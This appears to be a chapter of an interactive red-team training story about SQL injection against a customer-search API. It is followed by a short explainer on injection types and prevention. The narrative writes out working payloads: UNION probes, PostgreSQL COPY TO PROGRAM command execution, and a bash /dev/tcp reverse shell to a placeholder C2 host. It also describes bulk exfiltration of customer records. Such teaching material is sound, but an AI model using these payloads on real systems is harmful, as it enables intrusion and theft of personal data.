---
title: "The AI-Assisted Breach — Chapter 2: SQL Injection"
chain: "ai-breach"
chainOrder: 2
role: "red-teamer"
attack: "sql-injection"
choices:
  - label: "Leverage the SQL injection for OS command execution"
    next: "lateral-movement"
  - label: "Exfiltrate the database and enumerate the network"
    next: "lateral-movement"
isDebrief: false
---

You probe the `/v2/customers/search` endpoint with the chatbot service account credentials. The `q` parameter is interpolated directly into a SQL query — no parameterization, no WAF, no input filtering. A simple `' OR 1=1 --` confirms blind boolean injection.

You switch to UNION-based injection for efficiency. `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --` returns a clean response with six columns — matching the customer table schema. You enumerate the database: `information_schema.tables` reveals 47 tables including `customers`, `payments`, `employees`, and `api_keys`. The `customers` table contains 2.3 million rows.

You extract the data using batched UNION queries, exfiltrating 500 rows per request through the API's JSON response. Full extraction takes eight hours at a conservative rate to avoid triggering any rate limiting.

Then you escalate. PostgreSQL 14 with `pg_execute_server_program`: `'; COPY (SELECT '') TO PROGRAM 'id' --` returns `uid=999(postgres)`. You establish a reverse shell: `'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/[C2]/4444 0>&1"' --`. You now have OS-level access on the database server.

---

## What Is SQL Injection?

SQL injection exploits insufficient input handling in database queries. The vulnerability taxonomy includes: in-band (UNION-based, error-based), blind (boolean-based, time-based), and out-of-band (DNS, HTTP exfiltration). PostgreSQL-specific escalation paths include `COPY TO PROGRAM` for OS command execution, `pg_read_file()` for local file access, and `dblink` for SSRF. MSSQL offers `xp_cmdshell` and `sp_oacreate`. MySQL provides `INTO OUTFILE` and UDF injection. Automated tools like sqlmap handle detection and exploitation, but manual testing is required for complex injection points. Prevention is straightforward: parameterized queries, stored procedures, least-privilege database accounts, and WAF rules as defense-in-depth.
